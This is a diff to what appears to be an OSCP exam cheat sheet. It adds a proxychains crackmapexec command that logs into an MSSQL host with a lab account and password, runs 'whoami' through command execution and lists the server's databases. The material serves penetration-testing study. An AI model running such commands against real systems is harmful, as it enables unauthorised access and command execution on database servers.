@@ -874,6 +874,8 @@ nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config
 ##### Crackmapexec
 ````
 proxychains crackmapexec mssql -d oscp.exam -u sql_svc -p Dolphin1  -x "whoami" 10.10.126.148
+proxychains crackmapexec mssql -d oscp.exam -u sql_svc -p Dolphin1  -x "whoami" 10.10.126.148 -q 'SELECT name FROM master.dbo.sysdatabases;'
+
 ````
 ##### Logging in
 ````
